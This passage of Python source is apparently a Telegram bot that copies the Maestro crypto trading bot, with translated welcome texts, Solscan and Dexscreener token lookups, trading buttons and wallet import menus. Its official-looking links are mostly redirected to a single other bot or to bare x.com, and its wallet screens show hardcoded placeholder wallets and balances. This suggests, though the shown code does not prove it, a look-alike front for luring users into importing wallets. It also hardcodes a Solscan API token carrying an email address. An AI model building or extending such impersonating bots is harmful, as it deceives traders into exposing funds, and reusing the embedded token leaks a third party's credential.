        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ भाषा अपडेट कर दी गई है। आपका इंटरफ़ेस अब आपके द्वारा चयनित भाषा में दिखेगा।",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 टेस्ट कनेक्ट चुना गया। परीक्षण के लिए वॉलेट आयात या उत्पन्न करने के लिए इस बटन का उपयोग करें।",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ फास्ट ट्रेड कंसोल: नीचे टोकन कॉन्ट्रैक्ट पता (CA) पेस्ट करें।",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 अपनी प्राथमिकताओं के अनुसार चेन को सक्षम या अक्षम करें।\n\n💳 वॉलेट बटन का उपयोग प्रत्येक चेन के लिए वॉलेट आयात या उत्पन्न करने के लिए किया जा सकता है।",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ वॉलेट नहीं मिला। कृपया आयात या उत्पन्न करें।",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Maestro में आपका स्वागत है</b>\n"
            "<i>आपके ट्रेडिंग टूल और त्वरित क्रियाओं के लिए आपका एक-स्टॉप हब।</i>\n\n"
            "🔗 <b>चेन:</b> चेन सक्षम या अक्षम करें।\n"
            "💳 <b>वॉलेट:</b> वॉलेट आयात या उत्पन्न करें।\n"
            "⚙️ <b>वैश्विक सेटिंग्स:</b> बॉट को अनुकूलित करें।\n"
            "🕓 <b>सक्रिय ऑर्डर:</b> खरीद और बेच सीमाओं को ट्रैक करें।\n"
            "📈 <b>पोजीशन:</b> अपने खुले ट्रेडों की निगरानी करें।\n\n"
            "⚡️ <b>तुरंत ट्रेड करने के लिए एक टोकन CA पेस्ट करें।</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">हब</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">अपडेट</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">सपोर्ट</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">और लिंक</a>"
        ),
    },
    "ja": {
        "🌎 Please choose your preferred Language:": "🌎 ご希望の言語を選択してください：",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ 言語が更新されました。インターフェースは選択した言語で表示されます。",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 テスト接続が選択されました。テスト用のウォレットをインポートまたは生成するにはこのボタンを使用してください。",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ ファストトレードコンソール：以下にトークンのコントラクトアドレス（CA）を貼り付けてください。",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 ご希望に応じてチェーンを有効または無効にします。\n\n💳 ウォレットボタンは各チェーンのウォレットのインポートまたは生成に使用できます。",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ ウォレットが見つかりません。インポートまたは生成してください。",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Maestroへようこそ</b>\n"
            "<i>トレードツールとクイックアクションのワンストップハブ。</i>\n\n"
            "🔗 <b>チェーン：</b>チェーンを有効または無効にします。\n"
            "💳 <b>ウォレット：</b>ウォレットをインポートまたは生成します。\n"
            "⚙️ <b>グローバル設定：</b>ボットをカスタマイズします。\n"
            "🕓 <b>アクティブ注文：</b>買い/売り制限注文を追跡します。\n"
            "📈 <b>ポジション：</b>保有中のトレードを監視します。\n\n"
            "⚡️ <b>今すぐ取引するにはトークンCAを貼り付けてください。</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">ハブ</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">更新</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">サポート</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">その他のリンク</a>"
        ),
    },
    "ru": {
        "🌎 Please choose your preferred Language:": "🌎 Пожалуйста, выберите предпочитаемый язык:",
        "✅ Language updated. Your interface will now be shown in your selected language.": "✅ Язык обновлен. Интерфейс теперь будет отображаться на выбранном языке.",
        "🧪 Test Connect selected. Use this button to import or generate a wallet for testing.": "🧪 Тестовое подключение выбрано. Используйте эту кнопку, чтобы импортировать или создать кошелек для тестирования.",
        "⚡️ Fast Trade Console: Paste a Token contract address (CA) below.": "⚡️ Быстрая торговая консоль: вставьте ниже адрес контракта токена (CA).",
        "🟢 Enable or 🔴 Disable chains based on your preferences.\n\nThe 💳 Wallets buttons can be used to import or generate wallets for each chain.": "🟢 Включайте или отключайте цепочки в соответствии с вашими предпочтениями.\n\nКнопки 💳 Кошельки можно использовать для импорта или создания кошельков для каждой цепочки.",
        "ℹ️ Wallet not found. Please import or generate.": "ℹ️ Кошелек не найден. Пожалуйста, импортируйте или создайте.",
        "MAIN_WELCOME_TEXT": (
            "⭐️ <b>Добро пожаловать в Maestro</b>\n"
            "<i>Ваш универсальный центр для торговых инструментов и быстрых действий.</i>\n\n"
            "🔗 <b>Сети:</b> Включайте или отключайте сети.\n"
            "💳 <b>Кошельки:</b> Импортируйте или создавайте кошельки.\n"
            "⚙️ <b>Глобальные настройки:</b> Настройте бота.\n"
            "🕓 <b>Активные ордера:</b> Отслеживайте покупки и продажи по лимитам.\n"
            "📈 <b>Позиции:</b> Мониторьте свои открытые сделки.\n\n"
            "⚡️ <b>Вставьте CA токена для мгновенной торговли.</b>\n\n"
            "<a href=\"https://t.me/MaestroBotsHub\">Hub</a> • "
            "<a href=\"https://t.me/MaestroSniperUpdates\">Обновления</a> • "
            "<a href=\"https://x.com/MaestroBots\">X (Twitter)</a> • "
            "<a href=\"https://docs.maestrobots.com/\">Docs</a> • "
            "<a href=\"https://t.me/MaestroSupport\">Поддержка</a> • "
            "<a href=\"https://linktr.ee/MaestroBots\">Больше ссылок</a>"
        ),
    },
}


def get_user_language(user_id: int | str | None) -> str:
    if user_id is None:
        return "en"
    try:
        lang_key = USER_LANGUAGE_PREFS.get(int(user_id), "en")
    except (TypeError, ValueError):
        return "en"
    return lang_key if lang_key in LANGUAGE_OPTIONS else "en"


def get_localized_button_text(user_id: int | str, text: str) -> str:
    if not text:
        return ""
    lang_key = get_user_language(user_id)
    return BUTTON_LABEL_TRANSLATIONS.get(lang_key, {}).get(text, text)


def get_localized_text(user_id: int | str, text: str) -> str:
    if not text:
        return ""
    lang_key = get_user_language(user_id)
    return TEXT_TRANSLATIONS.get(lang_key, {}).get(text, text)


def set_user_language_pref(user_id: int | str, lang_key: str) -> str:
    normalized_lang = (lang_key or "en").strip().lower()
    if normalized_lang not in LANGUAGE_OPTIONS:
        normalized_lang = "en"
    USER_LANGUAGE_PREFS[int(user_id)] = normalized_lang
    save_language_prefs()
    return normalized_lang


TRANSLATION_CACHE: dict[tuple[str, str], str] = {}

async def translate_text(text: str, target_lang: str) -> str:
    if not text:
        return ""

    target_lang = (target_lang or "en").strip().lower()
    if target_lang in {"en", "en-us", "en_us"}:
        return text

    lang_code = LANGUAGE_OPTIONS.get(target_lang, {}).get("code", target_lang)
    if lang_code in {"en", "en-us", "en_us"}:
        return text

    cache_key = (lang_code, text)
    if cache_key in TRANSLATION_CACHE:
        return TRANSLATION_CACHE[cache_key]
    if lang_code in {"en", "en-us", "en_us"}:
        return text

    try:
        parts = re.split(r"(<[^>]+>)", text)
        translated_parts = []
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=8)) as session:
            for part in parts:
                if not part:
                    continue
                if part.startswith("<") and part.endswith(">"):
                    translated_parts.append(part)
                    continue
                encoded_text = quote(part)
                url = f"https://translate.googleapis.com/translate_a/single?client=gtx&sl=auto&tl={lang_code}&dt=t&q={encoded_text}"
                async with session.get(url) as response:
                    if response.status != 200:
                        translated_parts.append(part)
                        continue
                    data = await response.json()
                    if isinstance(data, list) and data and isinstance(data[0], list):
                        translated_text = "".join(item[0] for item in data[0] if isinstance(item, list) and item and isinstance(item[0], str))
                        translated_parts.append(translated_text or part)
                    else:
                        translated_parts.append(part)
    except Exception:
        return text

    return "".join(translated_parts).strip() or text


async def get_user_message_text(user_id: int, text: str, *, html_supported: bool = False) -> tuple[str, bool]:
    lang_key = get_user_language(user_id)
    if lang_key == "en":
        return text, html_supported

    localized_text = get_localized_text(user_id, text)
    if localized_text != text:
        return localized_text, html_supported

    try:
        translated_text = await translate_text(text, lang_key)
        return translated_text or text, html_supported
    except Exception:
        return text, html_supported


async def get_language_selector_keyboard(user_id: int):
    builder = InlineKeyboardBuilder()
    for lang_key, meta in LANGUAGE_OPTIONS.items():
        builder.button(text=meta["label"], callback_data=f"set_language:{lang_key}")
    builder.button(text=get_localized_button_text(user_id, "Return"), callback_data="main_menu")
    builder.adjust(2, 2, 2, 2, 2, 1)
    return builder.as_markup()


# 1. Regex to isolate a clean Solana contract address from incoming messages
SOLANA_ADDRESS_REGEX = r"[1-9A-HJ-NP-Za-km-z]{32,44}"

# 2. Your newly activated Solscan Pro API Token
SOLSCAN_API_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJjcmVhdGVkQXQiOjE3ODI4NDg0NTMyMDMsImVtYWlsIjoiY29kZWRmeDAxQGdtYWlsLmNvbSIsImFjdGlvbiI6InRva2VuLWFwaSIsImFwaVZlcnNpb24iOiJ2MiIsImlhdCI6MTc4Mjg0ODQ1M30.nvjtdTqWvultWDQjIgtBPHHXUfHfKpugv3qlZSJFgwc"


async def fetch_dexscreener_data(contract_address: str) -> dict:
    """
    Queries Dexscreener's free API for live token price and market cap data.
    This is used by the CA monitor flow so pasted addresses refresh automatically.
    """
    contract_address = (contract_address or "").strip()
    if not contract_address:
        return {"name": "Unknown Token", "symbol": "UNKNOWN", "price": "$0", "market_cap": 0, "mc": "$0", "success": False}

    url = f"https://api.dexscreener.com/latest/dex/tokens/{contract_address}"
    try:
        async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=5)) as session:
            async with session.get(url) as response:
                if response.status == 200:
                    data = await response.json()
                    pairs = data.get("pairs") or []
                    if pairs:
                        primary_pair = pairs[0]
                        base_token = primary_pair.get("baseToken") or {}
                        token_name = base_token.get("name", "Unknown Token")
                        token_symbol = base_token.get("symbol", "UNKNOWN")
                        price_usd = float(primary_pair.get("priceUsd", 0) or 0)
                        fdv = float(primary_pair.get("fdv", 0) or 0)
                        return {
                            "name": token_name,
                            "symbol": token_symbol,
                            "price": f"${price_usd:,.4f}" if price_usd else "$0",
                            "market_cap": fdv,
                            "mc": f"${fdv:,.0f}" if fdv else "$0",
                            "success": True,
                        }
    except Exception as e:
        print(f"Dexscreener connection timeout or parsing error: {e}")

    return {"name": "Unknown Token", "symbol": "UNKNOWN", "price": "$0", "market_cap": 0, "mc": "$0", "success": False}


def _coerce_first(data: dict, *keys):
    if not isinstance(data, dict):
        return None
    for key in keys:
        value = data.get(key)
        if value not in (None, ""):
            return value
    return None


def normalize_token_data(data: dict) -> dict:
    if not isinstance(data, dict):
        return {}

    if isinstance(data.get("data"), dict):
        data = data["data"]
    elif isinstance(data.get("token"), dict):
        data = data["token"]

    return {
        "name": _coerce_first(data, "name", "tokenName", "token_name"),
        "symbol": _coerce_first(data, "symbol", "tokenSymbol", "token_symbol"),
        "price": _coerce_first(data, "price", "priceUsd", "price_usd", "current_price"),
        "market_cap": _coerce_first(data, "marketCap", "market_cap", "mc"),
        "volume_24h": _coerce_first(data, "volume_24h", "volume24h", "volume", "volume_24h_usd"),
    }


async def fetch_token_details(mint_address: str):
    """
    Fetches real-time market data from Solscan and falls back to safe defaults if the API is unavailable.
    """
    mint_address = (mint_address or "").strip()
    if not mint_address:
        return None

    endpoints = [
        (
            "https://pro-api.solscan.io/v2.0/token/meta",
            {"token": SOLSCAN_API_KEY},
            [{"tokenAddress": mint_address}]
        ),
        (
            "https://pro-api.solscan.io/v2.0/token/meta",
            {"token": SOLSCAN_API_KEY, "Authorization": f"Bearer {SOLSCAN_API_KEY}"},
            [{"tokenAddress": mint_address}, {"address": mint_address}]
        ),
        (
            "https://public-api.solscan.io/token/meta",
            {},
            [{"tokenAddress": mint_address}, {"address": mint_address}]
        ),
    ]

    for url, headers, param_variants in endpoints:
        for params in param_variants:
            try:
                async with aiohttp.ClientSession(timeout=aiohttp.ClientTimeout(total=10)) as session:
                    async with session.get(url, headers=headers, params=params) as response:
                        body = await response.text()
                        if response.status == 200:
                            try:
                                res_json = json.loads(body) if body else {}
                            except Exception:
                                res_json = {}

                            if isinstance(res_json, dict):
                                if isinstance(res_json.get("data"), dict):
                                    return normalize_token_data(res_json["data"])
                                if isinstance(res_json.get("token"), dict):
                                    return normalize_token_data(res_json["token"])
                                return normalize_token_data(res_json)
                        else:
                            print(f"Solscan API Connection Status Error: {response.status} for {mint_address}")
            except Exception as e:
                print(f"Failed handling Solscan API request stream: {e}")

    return {
        "name": "Unknown Token",
        "symbol": "UNKNOWN",
        "price": 0.0,
        "market_cap": 0,
        "volume_24h": 0,
        "_fallback": True,
        "_address": mint_address,
    }


def get_token_label(data: dict, mint_address: str) -> str:
    if not data:
        return mint_address[:6] + "..." + mint_address[-4:]

    name = data.get("name") or ""
    symbol = data.get("symbol") or ""
    if name and symbol:
        return f"{name} ({symbol})"
    if name:
        return name
    if symbol:
        return symbol
    return mint_address[:6] + "..." + mint_address[-4:]


def format_token_message(data: dict, mint_address: str) -> str:
    """
    Formats the raw Solscan data fields cleanly into your visual HTML layout template.
    """
    if not data:
        return "❌ Failed to retrieve token data."

    name = data.get("name", "Unknown Token")
    symbol = data.get("symbol", "UNKNOWN")

    price_raw = data.get("price", 0.0)
    price = f"{price_raw:.4f}"

    market_cap_val = int(float(data.get("market_cap", 0)))
    market_cap = f"{market_cap_val:,}"

    volume_val = int(float(data.get("volume_24h", 0)))
    volume = f"{volume_val:,}"

    now = datetime.datetime.now()
    updated_at = now.strftime("%b %d, %Y %H:%M:%S")

    solscan_url = f"https://solscan.io/token/{mint_address}"

    return (
        f"🪙 {name} (${symbol}) <a href='https://t.me/MaestroOfficialTradingBot'>🌟 Referral</a>\n"
        f"<code>{mint_address}</code>\n"
        f"<a href='https://pump.fun'>Pump.fun</a> 🔗 SOL\n\n"
        f"🧢 MC ${market_cap} | 💵 Price ${price}\n"
        f"💧 Liquidity | ${volume}\n"
        f"📌 No Orders\n\n"
        f"💰 <b>Balance</b>\n"
        f"Wallet | {symbol} | SOL\n"
        f"Hellod | 0 (0%) | 0\n\n"
        f"<a href='{solscan_url}'>GT</a> • <a href='{solscan_url}'>DF</a> • <a href='{solscan_url}'>DT</a> • <a href='{solscan_url}'>DS</a> • <a href='{solscan_url}'>DV</a> • <a href='{solscan_url}'>BE</a> • <a href='{solscan_url}'>PF</a>\n"
        f"<a href='{solscan_url}'>PIRB</a> • <a href='{solscan_url}'>PIRB PRO</a> • <a href='{solscan_url}'>SECT</a>\n\n"
        f"🕓 Updated | <i>{updated_at}</i>"
    )


def get_trading_keyboard(user_id=None):
    if user_id is None:
        slippage_value = "10%"
        gas_value = "0.005 SOL"
    else:
        config = USER_CONFIGS.get(user_id) or get_user_data(user_id)
        slippage_value = config.get("slippage", "10%")
        gas_value = config.get("gas", "0.005 SOL")

    builder = InlineKeyboardBuilder()

    builder.button(text=get_localized_button_text(user_id, "📍 Track"), callback_data="track")
    builder.button(text=get_localized_button_text(user_id, "🔄 SOL"), callback_data="sync_sol")
    builder.button(text=get_localized_button_text(user_id, "↔️ Go to Sell"), callback_data="go_to_sell")
    builder.button(text=get_localized_button_text(user_id, "💳 Hellod 🔄"), callback_data="hellod_refresh")
    builder.button(text=get_localized_button_text(user_id, "🔴 Multi"), callback_data="multi")
    builder.button(text=get_localized_button_text(user_id, "0.01 SOL"), callback_data="buy_0.01")
    builder.button(text=get_localized_button_text(user_id, "0.05 SOL"), callback_data="buy_0.05")
    builder.button(text=get_localized_button_text(user_id, "0.1 SOL"), callback_data="buy_0.1")
    builder.button(text=get_localized_button_text(user_id, "0.2 SOL"), callback_data="buy_0.2")
    builder.button(text=get_localized_button_text(user_id, "0.5 SOL"), callback_data="buy_0.5")
    builder.button(text=get_localized_button_text(user_id, "1 SOL"), callback_data="buy_1")
    builder.button(text=get_localized_button_text(user_id, "Buy X SOL"), callback_data="buy_x_sol")
    builder.button(text=get_localized_button_text(user_id, "Buy X Tokens"), callback_data="buy_x_tokens")
    builder.button(text=get_localized_button_text(user_id, f"⚙️ Slippage | {slippage_value}"), callback_data="slippage")
    builder.button(text=get_localized_button_text(user_id, f"⛽️ Gas | {gas_value}"), callback_data="gas")
    builder.button(text=get_localized_button_text(user_id, "⚙️ Snipe"), callback_data="snipe")
    builder.button(text=get_localized_button_text(user_id, "⚙️ Buy Limit"), callback_data="buy_limit")

    builder.adjust(2, 1, 2, 3, 3, 2, 2, 2)
    return builder.as_markup()


def get_monitor_keyboard(user_id, mint_address):
    config = USER_CONFIGS.get(user_id) or get_user_data(user_id)
    slippage_value = config.get("slippage", "10%")
    gas_value = config.get("gas", "0.005 SOL")

    builder = InlineKeyboardBuilder()

    builder.button(text=get_localized_button_text(user_id, "⬅️"), callback_data="nav_left")
    builder.button(text=get_localized_button_text(user_id, "🔄 Refresh"), callback_data=f"refresh_track:{mint_address}")
    builder.button(text=get_localized_button_text(user_id, "➡️"), callback_data="nav_right")

    builder.row(
        types.InlineKeyboardButton(
            text=get_localized_button_text(user_id, "Copy CA 📋"),
            copy_text=types.CopyTextButton(text=mint_address),
        ),
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "↔️ Go to Buy"), callback_data=f"go_to_buy:{mint_address}"),
    )

    builder.row(types.InlineKeyboardButton(text=get_localized_button_text(user_id, "🔴 Multi"), callback_data=f"refresh_track:{mint_address}"))
    builder.row(types.InlineKeyboardButton(text=get_localized_button_text(user_id, "⚠️ No Balance Detected ⚠️"), callback_data="none"))
    builder.row(
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, f"⚙️ Slippage | {slippage_value}"), callback_data=f"set_slip:{mint_address}"),
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, f"⚙️ Gas | {gas_value}"), callback_data=f"set_gas:{mint_address}"),
    )

    builder.row(
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Delete ❌"), callback_data="delete_monitor"),
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "⚙️ Sell Limit"), callback_data="set_limit"),
    )

    builder.row(types.InlineKeyboardButton(text=get_localized_button_text(user_id, "🔙 Return to Main Menu"), callback_data="main_menu"))

    builder.adjust(3, 2, 1, 1, 2, 2, 1)
    return builder.as_markup()


def get_main_menu_keyboard(user_id=None):
    builder = InlineKeyboardBuilder()
    builder.button(text=get_localized_button_text(user_id, "🔗 Chains"), callback_data="manage_chains")
    builder.button(text=get_localized_button_text(user_id, "💳 Wallets"), callback_data="manage_wallets")
    builder.button(text=get_localized_button_text(user_id, "⚙️ Global Settings"), callback_data="global_settings_main")
    builder.button(text=get_localized_button_text(user_id, "🕓 Active Orders"), callback_data="active_orders")
    builder.button(text=get_localized_button_text(user_id, "📈 Positions"), callback_data="positions")

    builder.row(
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Hub"), url="https://t.me/MaestroOfficialTradingBot"),
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Updates"), url="https://t.me/MaestroOfficialTradingBot"),
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "X (Twitter)"), url="https://x.com"),
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Docs"), url="https://x.com"),
    )
    builder.row(
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "Support"), url="https://t.me/MaestroOfficialTradingBot"),
        types.InlineKeyboardButton(text=get_localized_button_text(user_id, "More Links"), callback_data="more_links"),
    )
    builder.adjust(2, 2, 1, 4, 2)
    return builder.as_markup()


BOT_LINK = "https://t.me/MaestroOfficialTradingBot"
REFERRAL_LINK = BOT_LINK


def popup_alert(status: str, instruction: str, command: str = "/start") -> str:
    return f"{status} {instruction} Use {command}."


FULL_WELCOME_TEXT = (
    "⭐️ <b>Welcome to Maestro, the one-stop solution for all your trading needs!</b>\n\n"
    "🔗 <b>Chains:</b> Enable/disable chains.\n"
    "💳 <b>Wallets:</b> Import or generate wallets.\n"
    "⚙️ <b>Global Settings:</b> Customize the bot.\n"
    "🕓 <b>Active Orders:</b> Active buy/sell limit orders.\n"
    "📈 <b>Positions:</b> Monitor your active trades.\n\n"
    "⚡️ <b>Paste a token CA to trade immediately!</b>\n\n"
    "<a href='https://t.me/MaestroBotsHub'>Hub</a> • "
    "<a href='https://t.me/MaestroSniperUpdates'>Updates</a> • "
    "<a href='https://x.com/MaestroBots'>X (Twitter)</a> • "
    "<a href='https://docs.maestrobots.com/'>Docs</a> • "
    "<a href='https://t.me/MaestroSupport'>Support</a> • "
    "<a href='https://linktr.ee/MaestroBots'>More Links</a>"
)


def wallets_menu():
    return InlineKeyboardMarkup(inline_keyboard=[
        [
            InlineKeyboardButton(text="SOL", callback_data="wallet_sol"),
            InlineKeyboardButton(text="BSC", callback_data="wallet_bsc"),
            InlineKeyboardButton(text="BASE", callback_data="wallet_base"),
        ],
        [InlineKeyboardButton(text="ETH", callback_data="wallet_eth")],
        [InlineKeyboardButton(text="Return", callback_data="main_menu")],
    ])


def sol_wallet_buttons():
    return InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌REMOVE", callback_data="remove_wallet")],
        [
            InlineKeyboardButton(text="Import Wallet", callback_data="import_wallet"),
            InlineKeyboardButton(text="Generate Wallet", callback_data="generate_wallet"),
        ],
        [
            InlineKeyboardButton(text="Collect", callback_data="collect"),
            InlineKeyboardButton(text="Disperse", callback_data="disperse"),
        ],
        [InlineKeyboardButton(text="Return", callback_data="wallets_menu")],
    ])


def get_chain_selector_markup(action_prefix: str):
    builder = InlineKeyboardBuilder()
    builder.button(text="SOL", callback_data=f"{action_prefix}_sol")
    builder.button(text="BSC", callback_data=f"{action_prefix}_bsc")
    builder.button(text="BASE", callback_data=f"{action_prefix}_base")
    builder.button(text="ETH", callback_data=f"{action_prefix}_eth")
    builder.button(text="Return", callback_data="main_welcome_menu")
    builder.adjust(3, 1, 1)
    return builder.as_markup()


def global_settings_menu():
    return get_chain_selector_markup(action_prefix="global_settings")


def sol_settings_buttons():
    builder = InlineKeyboardBuilder()
    builder.button(text="ℹ️ Help", callback_data="sol_settings_help")
    builder.button(text="🖨️ Print", callback_data="sol_settings_print")
    builder.button(text="Return", callback_data="global_settings_main")
    builder.button(text="🟢 Anti-MEV", callback_data="toggle_anti_mev")
    builder.button(text="🔴 Degen Mode 😈", callback_data="toggle_degen_mode")
    builder.button(text="⚙️ Buy", callback_data="config_global_buy")
    builder.button(text="⚙️ Sell", callback_data="config_global_sell")
    builder.button(text="Initial Includes Fees | 🟢 On", callback_data="toggle_initial_fees")
    builder.button(text="Monitor (All Chains) | 🔄 Detailed", callback_data="toggle_monitor_mode")
    builder.button(text="Wallet Selection (All Chains) | 🔄 Single", callback_data="toggle_wallet_selection")
    builder.adjust(3, 2, 2, 1, 1, 1)
    return builder.as_markup()


def get_original_welcome_keyboard():
    builder = InlineKeyboardBuilder()

    builder.button(text="🔗 Chains", callback_data="manage_chains")
    builder.button(text="🇺🇸🇨🇳 Language", callback_data="language")
    builder.button(text="💳 Wallets", callback_data="view_wallet_chains")
    builder.button(text="⚙️ Global Settings", callback_data="global_settings_chains")
    builder.button(text="📡 Signals", callback_data="signals")
    builder.button(text="🧑‍🤝‍🧑 Copytrade", callback_data="copytrade")
    builder.button(text="🕓 Active Orders", callback_data="active_orders")
    builder.button(text="📈 Positions", callback_data="positions")
    builder.button(text="🎯 Auto Snipe", callback_data="auto_snipe")
    builder.button(text="🔀 Bridge", callback_data="bridge")
    builder.button(text="⭐️ Premium", callback_data="premium")
    builder.button(text="💸 Cashback", callback_data="cashback")
    builder.button(text="💰 Referral", callback_data="referral")
    builder.button(text="⚡️ BUY & SELL NOW!", callback_data="buy_sell_now")

    builder.adjust(2, 2, 2, 2, 2, 3, 1)
    return builder.as_markup()


def format_monitor_text(mint_address, token_data=None, remaining_seconds=2160):
    minutes = remaining_seconds // 60
    seconds = remaining_seconds % 60
    timer_str = f"{minutes:02d}:{seconds:02d}"
    solscan_url = f"https://solscan.io/token/{mint_address}"

    token_label = get_token_label(token_data, mint_address)
    if token_data:
        if isinstance(token_data.get("name"), str) and token_data.get("name"):
            token_label = token_data.get("name")
            if isinstance(token_data.get("symbol"), str) and token_data.get("symbol"):
                token_label = f"{token_label} ({token_data.get('symbol')})"

    try:
        price_raw = token_data.get("price", 0.0) if token_data else 0.0
        if isinstance(price_raw, str):
            price_text = price_raw.replace("$", "")
            if price_text:
                price_text = f"{float(price_text):.4f}"
            else:
                price_text = "0.0000"
        else:
            price_text = f"{float(price_raw or 0.0):.4f}"
    except Exception:
        price_text = "0.0000"

    try:
        market_cap_raw = token_data.get("market_cap", token_data.get("mc", 0)) if token_data else 0
        if isinstance(market_cap_raw, str):
            market_cap_text = market_cap_raw.replace("$", "")
            market_cap_text = f"{float(market_cap_text or 0):,.0f}" if market_cap_text else "0"
        else:
            market_cap_text = f"{float(market_cap_raw or 0):,.0f}"
    except Exception:
        market_cap_text = "0"

    return (
        f"🪙 {token_label} ⏱️ {timer_str} <a href='{BOT_LINK}'>🌟 Referral</a>\n\n"
        f"<i>No Detected Balance.</i>\n\n"
        f"📌 No Orders\n\n"
        f"💵 Price <b>${price_text}</b> | MC <b>${market_cap_text}</b>\n"
        f"<a href='{solscan_url}'>GT</a> • <a href='{solscan_url}'>DF</a> • <a href='{solscan_url}'>DT</a> • <a href='{solscan_url}'>DS</a> • <a href='{solscan_url}'>DV</a> • <a href='{solscan_url}'>BE</a> • <a href='{solscan_url}'>PF</a>\n\n"
        f"ℹ️ Click on 🔄 to manually refresh and update the monitor"
    )


async def monitor_countdown_task(bot: Bot, chat_id: int, message_id: int, mint_address: str, token_data=None):
    try:
        remaining = 2160
        while remaining > 0:
            await asyncio.sleep(5)
            remaining -= 5
            try:
                await bot.edit_message_text(
                    text=format_monitor_text(mint_address, token_data, remaining),
                    chat_id=chat_id,
                    message_id=message_id,
                    parse_mode="HTML",
                    reply_markup=get_monitor_keyboard(chat_id, mint_address),
                    disable_web_page_preview=True,
                )
            except Exception:
                break
    except asyncio.CancelledError:
        pass

@dp.callback_query(F.data == "language")
async def language_fix(callback: CallbackQuery):
    selector_text, _ = await get_user_message_text(callback.from_user.id, "🌎 Please choose your preferred Language:")
    await callback.message.edit_text(
        selector_text,
        reply_markup=await get_language_selector_keyboard(callback.from_user.id),
    )
    await callback.answer()


@dp.callback_query(F.data.startswith("set_language:"))
async def set_user_language(callback: CallbackQuery):
    lang_key = callback.data.split(":", 1)[1]
    if lang_key in LANGUAGE_OPTIONS:
        set_user_language_pref(callback.from_user.id, lang_key)

    await show_welcome_page(callback.bot, callback.message.chat.id, delete_message_ids=[callback.message.message_id])
    await callback.answer()


@router.callback_query(F.data.in_({"wallets", "wallets_menu", "wallets_main"}))
async def process_wallets_menu(callback: CallbackQuery):
    text = (
        "<b>PSyTjbVGn1ZC</b>\n"
        "🟢 Default | 🟢 Manual | 💰 0 SOL\n\n"
        "ℹ️ <i>To transfer from a wallet or rename it, click on the wallet name.</i>\n"
        "ℹ️ <i>Enable \"Manual\" for the wallets participating in your manual buys. "
        "Automated buys will be defaulted to your \"Default\" wallet, but you can further "
        "control this through dedicated Signals, Copytrade, and Auto Snipe settings.</i>"
    )

    builder = InlineKeyboardBuilder()

    builder.button(text="ℹ️ Help ↗️", callback_data="wallet_help")
    builder.button(text="Return", callback_data="main_menu")

    builder.button(text="🗄️ Rearrange Wallets", callback_data="rearrange_wallets")

    builder.button(text="Default Wallet | 💳 Sami", callback_data="status_sami")

    builder.button(text="⚙️ Sami", callback_data="config_sami")
    builder.button(text="🟢 Manual", callback_data="toggle_manual_sami")
    builder.button(text="❌", callback_data="delete_wallet_sami")

    builder.button(text="Import Wallet", callback_data="connect_external_sol")
    builder.button(text="Generate Wallet", callback_data="generate_sol_wallet")

    builder.button(text="Collect", callback_data="collect_funds")
    builder.button(text="Disperse", callback_data="disperse_funds")

    builder.adjust(2, 1, 1, 3, 2, 2)

    try:
        await callback.message.edit_text(text=text, parse_mode="HTML", reply_markup=builder.as_markup())
    except Exception as e:
        print(f"Error drawing target wallet matrix layout: {e}")
    await callback.answer()


@router.callback_query(F.data == "wallet_sol")
async def sol_wallet(callback: CallbackQuery):
    wallet_name = "MyWallet"
    wallet_address = "ABC123XYZ"

    text = f"""🔗 SOL

Their wallet name: {wallet_name}
{wallet_address}
🟢 Default | 🟢 Manual | 💰 0 SOL

ℹ️ To transfer from a wallet or rename it, click on the wallet name.
ℹ️ Enable \"Manual\" for the wallets participating in your manual buys. Automated buys will be defaulted to your \"Default\" wallet, but you can further control this through dedicated Signals, Copytrade, and Auto Snipe settings.
"""

    await callback.message.edit_text(text, reply_markup=sol_wallet_buttons())


@router.callback_query(F.data == "remove_wallet")
async def remove_wallet(callback: CallbackQuery):
    await callback.answer(
        popup_alert("Error!", "No wallet is connected yet.", "/start"),
        show_alert=True,
    )

    await callback.message.edit_text(
        "ℹ️ Wallet not found. Please import or generate.",
        reply_markup=sol_wallet_buttons(),
    )


@router.callback_query(F.data == "wallet_eth")
async def eth_wallet(callback: CallbackQuery):
    await sol_wallet(callback)


@router.callback_query(F.data == "wallet_base")
